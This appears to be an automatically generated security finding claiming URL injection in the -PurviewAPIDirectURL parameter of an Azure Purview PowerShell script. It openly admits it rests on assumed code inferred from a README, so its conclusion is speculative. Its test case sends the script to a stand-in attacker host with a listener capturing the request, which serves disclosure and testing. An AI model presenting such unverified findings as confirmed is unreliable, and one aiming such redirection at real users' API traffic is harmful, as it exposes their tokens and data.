#### 1. Vulnerability Name: URL Injection in `-PurviewAPIDirectURL` parameter

- **Description:**
    1. The PowerShell script `Purview-API-PowerShell.ps1` (based on documentation and usage examples in README.md) in Batch mode allows users to specify the target Azure Purview API endpoint using the `-PurviewAPIDirectURL` parameter.
    2. The script is intended to interact with Azure Purview REST APIs, but if the provided URL is not properly validated or sanitized, an attacker can inject a malicious URL.
    3. When the script processes the `-PurviewAPIDirectURL` parameter, it uses it to construct the API request without sufficient security checks.
    4. This allows an attacker to redirect the API request to an unintended destination, potentially an attacker-controlled server, or to manipulate the parameters of the API request itself.
    5. By controlling the URL, an attacker could potentially exfiltrate sensitive information, bypass security measures, or possibly perform unauthorized actions depending on the script's functionality and the attacker's crafted URL.

- **Impact:**
    - **Information Disclosure:** An attacker could redirect API requests to their own server and potentially capture sensitive information intended for the Azure Purview API. This could include API keys, tokens, or data being sent in the API request.
    - **Redirection to Malicious Site:** Users might unknowingly interact with a malicious site disguised as the Purview API endpoint, potentially leading to phishing attacks or further compromise.
    - **Bypass Security Controls:** By manipulating the URL, an attacker might be able to bypass intended access controls or security checks implemented on the legitimate Purview API endpoint if the script relies solely on the provided URL.
    - **Potential Unauthorized Actions:** In more advanced scenarios, if the attacker can manipulate API parameters through URL injection and the script improperly handles responses or actions based on the URL, it might be possible to trigger unintended actions within the Purview account, depending on the permissions of the script's execution context.

- **Vulnerability Rank:** Medium

- **Currently Implemented Mitigations:**
    - None. Based on the provided files (specifically the README.md and absence of code), there is no evidence of URL validation or sanitization implemented in the script for the `-PurviewAPIDirectURL` parameter. The documentation encourages users to refer to official Purview API documentation, but this is not a technical mitigation within the script itself.

- **Missing Mitigations:**
    - **URL Validation:** Implement robust URL validation to ensure that the `-PurviewAPIDirectURL` parameter points to a legitimate Azure Purview API endpoint. This should include:
        - **Hostname validation:** Verify that the hostname belongs to the expected Azure Purview domain (e.g., `*.purview.azure.com`).
        - **Protocol validation:** Enforce the use of HTTPS protocol to ensure encrypted communication.
        - **Path validation:** If possible, validate the expected path structure of the Purview API endpoint.
    - **URL Sanitization:** Sanitize the URL to encode or remove any potentially harmful characters or parameters before using it in API requests. This can help prevent various injection attacks.
    - **Input Validation in General:** Implement input validation for all parameters accepted by the script to prevent other types of injection vulnerabilities.

- **Preconditions:**
    - The user must execute the `Purview-API-PowerShell.ps1` script in Batch mode.
    - The user must use the `-APIDirect` and `-PurviewAPIDirectURL` parameters to directly specify the API endpoint.
    - An attacker needs to be able to influence the value of the `-PurviewAPIDirectURL` parameter provided to the script. This could be achieved through social engineering, tricking a user into running the script with a malicious URL, or by compromising a system where the script is executed and modifying script parameters or configuration.

- **Source Code Analysis:**
    - **Assumed vulnerable code structure in `Purview-API-PowerShell.ps1` (based on README usage examples):**
    ```powershell
    param (
        [string]$PurviewAccountName,
        [switch]$APIDirect,
        [string]$PurviewAPIDirectURL,
        [string]$HTTPMethod,
        [string]$InputFile,
        [string]$OutputFile
    )

    if ($APIDirect) {
        # Vulnerable code: Directly using user-provided URL without validation
        $apiUrl = $PurviewAPIDirectURL

        # ... construct request and invoke API using $apiUrl ...
        # Example of potentially vulnerable invocation:
        # Invoke-WebRequest -Uri $apiUrl -Method $HTTPMethod -Body ...
    } # ... (rest of the script)
    ```
    - **Vulnerability Explanation:**
        - The script takes the `-PurviewAPIDirectURL` parameter as input without any validation or sanitization when the `-APIDirect` switch is used.
        - The value of `$PurviewAPIDirectURL` is directly assigned to `$apiUrl`, which is then used in `Invoke-WebRequest` (or a similar command) to make the API call.
        - If an attacker provides a malicious URL as the value for `-PurviewAPIDirectURL`, the `Invoke-WebRequest` command will attempt to make a request to this attacker-controlled URL.
        - This direct usage of user-provided URL without validation is the root cause of the URL Injection vulnerability.
    - **Visualization:**
        ```
        User Input (-PurviewAPIDirectURL) --> [Purview-API-PowerShell.ps1] --> $PurviewAPIDirectURL (No Validation) --> $apiUrl --> Invoke-WebRequest -Uri $apiUrl --> HTTP Request to potentially malicious URL
        ```

- **Security Test Case:**
    1. **Prerequisites:**
        - Access to a system where you can execute the `Purview-API-PowerShell.ps1` script.
        - Set up a simple HTTP listener (e.g., using `netcat` or Python's `http.server`) on your attacker-controlled machine to capture incoming HTTP requests. For example, using Python: `python3 -m http.server 8080`
        - Note the IP address or hostname of your attacker machine (e.g., `attacker.example.com` or `192.168.1.100`).
    2. **Execution:**
        - Open PowerShell and navigate to the directory containing `Purview-API-PowerShell.ps1`.
        - Execute the script with a crafted `-PurviewAPIDirectURL` pointing to your attacker-controlled HTTP listener:
            ```powershell
            Purview-API-PowerShell.ps1 -APIDirect -HTTPMethod GET -PurviewAPIDirectURL "http://attacker.example.com:8080/malicious/path?attack=url_injection"
            ```
            Replace `attacker.example.com:8080` with the actual address of your HTTP listener.
        - Observe the script execution. It might output errors if it expects a specific response from the Purview API, but this is not relevant to confirming the URL injection.
    3. **Verification:**
        - Check the logs of your HTTP listener on your attacker machine.
        - You should observe a GET request received by your HTTP listener. The request should have the path and parameters you injected in the `-PurviewAPIDirectURL`: `/malicious/path?attack=url_injection`.
        - The presence of this request in your attacker's HTTP listener logs confirms that the `Purview-API-PowerShell.ps1` script indeed used the attacker-provided URL to make an HTTP request, demonstrating the URL Injection vulnerability.